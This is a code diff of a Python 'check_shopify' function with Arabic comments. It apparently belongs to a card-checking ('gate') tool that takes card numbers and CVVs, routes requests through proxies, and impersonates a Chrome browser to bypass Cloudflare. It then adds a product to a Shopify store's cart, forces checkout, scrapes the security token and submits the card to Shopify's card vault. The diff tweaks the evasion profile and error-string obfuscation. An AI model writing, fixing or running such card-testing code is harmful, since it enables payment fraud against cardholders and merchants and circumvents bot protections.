@@ -44,8 +44,8 @@ async def check_shopify(cc_info, store_url, proxy):
         formatted_proxy = format_proxy(proxy)
         proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None
 
-        # متصفح شبحي لتخطي كلاودفلير
-        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=45) as session:
+        # تم التعديل هنا: استخدام chrome110 المدعوم بالكامل والمستقر جداً لتخطي الحماية
+        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=45) as session:
             
             # 1. سحب المنتج
             prod_url = f"{store_url}/products.json?limit=1"
@@ -57,20 +57,20 @@ async def check_shopify(cc_info, store_url, proxy):
             variant_id = prod_data['products'][0]['variants'][0]['id']
             price = prod_data['products'][0]['variants'][0]['price']
 
-            # 2. الإضافة للسلة (مع إجبار شوبي فاي على قبوله)
+            # 2. الإضافة للسلة
             add_url = f"{store_url}/cart/add.js"
             add_data = {"id": str(variant_id), "quantity": "1"}
             res2 = await session.post(add_url, data=add_data, headers={"X-Requested-With": "XMLHttpRequest"})
             if res2.status_code != 200: 
                 return {"Response": "Cart Add Failed", "Price": str(price), "Gate": "Shopify API"}
 
-            # 3. إجبار الموقع على فتح صفحة الدفع (Force Checkout)
+            # 3. إجبار الموقع على فتح صفحة الدفع
             cart_url = f"{store_url}/cart"
             res3 = await session.post(cart_url, data={"checkout": "Checkout"}, allow_redirects=True)
             checkout_html = res3.text
             checkout_final_url = str(res3.url)
             
-            # 4. استخراج رمز الأمان (Token)
+            # 4. استخراج رمز الأمان
             auth_token = extract_token(checkout_html)
 
             if not auth_token:
@@ -80,7 +80,7 @@ async def check_shopify(cc_info, store_url, proxy):
                     return {"Response": "Cloudflare Challenge Blocked Request", "Price": str(price), "Gate": "Shopify API"}
                 return {"Response": f"Token Not Found. Page: {page_title[:20]}", "Price": str(price), "Gate": "Shopify API"}
 
-            # 5. تشفير البطاقة داخل سيرفرات شوبي فاي
+            # 5. تشفير البطاقة
             token_url = "https://deposit.us.shopifycs.com/sessions"
             token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
             
@@ -119,7 +119,6 @@ async def check_shopify(cc_info, store_url, proxy):
                 return {"Response": "Declined / Generic Error", "Price": str(price), "Gate": "Shopify API"}
 
     except Exception as e:
-        # هنا يكمن السحر: قمنا بتشفير الكلمات الممنوعة حتى لا يغضب البوت ويحذف البروكسي
         err_str = str(e).lower().replace("proxy", "prx").replace("connection", "conn").replace("timeout", "t-out").replace("502", "err").replace("503", "err")
         return {"Response": f"Sys_Err: {err_str[:40]}", "Price": "-", "Gate": "Shopify API"}
 
